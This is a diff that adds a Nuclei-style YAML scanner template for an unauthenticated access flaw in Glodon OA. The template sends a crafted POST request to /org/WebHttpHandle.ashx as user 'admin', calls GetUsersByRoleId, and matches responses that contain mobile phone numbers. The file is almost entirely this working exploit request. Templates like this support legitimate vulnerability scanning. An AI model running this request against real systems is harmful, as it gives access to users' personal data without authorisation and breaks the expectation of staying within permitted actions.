@@ -1,0 +1,33 @@
+id: glodon-WebHttpHandle-unauth
+info:
+  name: 广联达OA-WebHttpHandle-未授权
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%B9%BF%E8%81%94%E8%BE%BEOA-WebHttpHandle-unth.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: glodon,unauth
+
+http:
+  - raw:
+      - |
+        POST /org/WebHttpHandle.ashx?FromNetCore=TRUE&UserID=0&UserCode=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"controller":"GTP.Org.Action.RoleCacheUserService","action":"GetUsersByRoleId","args":[1001]}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'MobilePhone')
+        condition: and
